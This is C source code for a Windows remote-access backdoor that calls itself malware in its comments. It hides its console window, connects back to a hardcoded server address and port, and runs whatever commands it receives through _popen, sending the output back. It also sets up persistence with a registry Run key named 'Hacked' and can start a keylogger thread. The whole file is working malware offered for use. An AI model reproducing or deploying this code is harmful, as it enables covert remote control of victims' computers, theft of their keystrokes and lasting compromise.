
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;


/*function to create persistence to our target and store registry key
of our program to help our program to run automatically
 everytime we open our pc without necessary clicking the malware
*/
int bootRun()
{
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; //variable to store path to the registry
	DWORD pathLen = 0;

	//retrieving the fully path to our malware
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal; //handle to an open registry key

	//opening the key
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

  /* function to help us cutting our command with our directory name
   the function takes the string and number from where we need to start cutting and where
   we need to end from
  */
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];


	while (1) {
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0) { //compare the command with cd
			chdir(str_cut(buffer,3,100));  //changing our program directory
		}
		else if (strncmp("persist", buffer, 7) == 0) { //compare our buffer with persist
			bootRun();  //calling the bootRun function
		}
		else if (strncmp("keylog_start", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
			goto jump;
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}

	}

}

//windows main function

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
       
         /* hiding our program console window, so that once our malware is clicked,
         no window will be opened in case the client can think it is not working while it is running in the background
        */
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);

        //declaring variables to store server address and port
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "192.168.42.5"; //the ip address of our server
	ServPort = 50005;  //port on which our server is running on


        //The WSAStartup function initiates use of the Winsock DLL by a process.
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

        //define our socket object
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr)); //clear our server address variable to zero
	ServAddr.sin_family = AF_INET; //ipv4 connection
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //convert our ip address string to inet object
	ServAddr.sin_port = htons(ServPort);


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}
